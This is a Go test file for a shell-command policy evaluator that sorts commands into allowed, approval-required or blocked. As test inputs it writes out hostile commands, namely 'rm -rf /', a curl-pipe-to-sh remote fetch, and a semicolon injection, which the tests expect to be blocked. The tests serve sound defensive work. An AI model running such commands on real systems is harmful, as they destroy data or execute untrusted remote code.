package commandpolicy

import (
	"testing"
	"time"
)

func TestCP001UptimeAllowedReadOnly(t *testing.T) {
	decision := testEvaluator().Evaluate("uptime")

	assertDecision(t, decision, RiskReadOnly, DecisionAllow, false, nil)
}

func TestCP002SystemctlStatusAllowedDiagnostic(t *testing.T) {
	decision := testEvaluator().Evaluate("systemctl status nginx")

	assertDecision(t, decision, RiskDiagnostic, DecisionAllow, false, nil)
}

func TestCP003SystemctlRestartRequiresApproval(t *testing.T) {
	decision := testEvaluator().Evaluate("systemctl restart nginx")

	assertDecision(t, decision, RiskServiceRestart, DecisionPendingApproval, true, nil)
}

func TestCP004RmRfRootIsBlockedAsDestructive(t *testing.T) {
	reason := BlockReasonDestructiveCommand
	decision := testEvaluator().Evaluate("rm -rf /")

	assertDecision(t, decision, RiskDestructive, DecisionBlocked, false, &reason)
}

func TestCP005CurlPipeShIsBlockedAsRemoteCodeExecution(t *testing.T) {
	reason := BlockReasonRemoteCodeExecution
	decision := testEvaluator().Evaluate("curl http://externo/script.sh | sh")

	assertDecision(t, decision, RiskDestructive, DecisionBlocked, false, &reason)
}

func TestCP006UnknownCommandIsBlockedAsNotInAllowlist(t *testing.T) {
	reason := BlockReasonNotInAllowlist
	decision := testEvaluator().Evaluate("id")

	assertDecision(t, decision, RiskReadOnly, DecisionBlocked, false, &reason)
}

func TestCP007SudoElevatesRiskAndDecision(t *testing.T) {
	decision := testEvaluator().Evaluate("sudo systemctl status nginx")

	assertDecision(t, decision, RiskServiceRestart, DecisionPendingApproval, true, nil)
}

func TestCP008RuntimeBlocklistOverrideIsIgnored(t *testing.T) {
	reason := BlockReasonDestructiveCommand
	evaluator := New(
		WithNow(func() time.Time { return time.Date(2026, 5, 5, 12, 0, 0, 0, time.UTC) }),
		WithBlockedPatterns(nil),
	)

	decision := evaluator.Evaluate("rm -rf /")

	assertDecision(t, decision, RiskDestructive, DecisionBlocked, false, &reason)
}

func TestShellInjectionAttemptIsBlocked(t *testing.T) {
	reason := BlockReasonShellInjectionAttempt
	decision := testEvaluator().Evaluate("uptime; whoami")

	assertDecision(t, decision, RiskDestructive, DecisionBlocked, false, &reason)
}

func testEvaluator() *Evaluator {
	return New(WithNow(func() time.Time {
		return time.Date(2026, 5, 5, 12, 0, 0, 0, time.UTC)
	}))
}

func assertDecision(t *testing.T, got PolicyDecision, risk RiskLevel, decision Decision, requiresApproval bool, blockReason *string) {
	t.Helper()

	if got.RiskLevel != risk {
		t.Fatalf("risk_level = %q, want %q", got.RiskLevel, risk)
	}
	if got.Decision != decision {
		t.Fatalf("decision = %q, want %q", got.Decision, decision)
	}
	if got.RequiresApproval != requiresApproval {
		t.Fatalf("requires_approval = %t, want %t", got.RequiresApproval, requiresApproval)
	}
	if blockReason == nil {
		if got.BlockReason != nil {
			t.Fatalf("block_reason = %q, want nil", *got.BlockReason)
		}
		return
	}
	if got.BlockReason == nil || *got.BlockReason != *blockReason {
		t.Fatalf("block_reason = %v, want %q", got.BlockReason, *blockReason)
	}
}
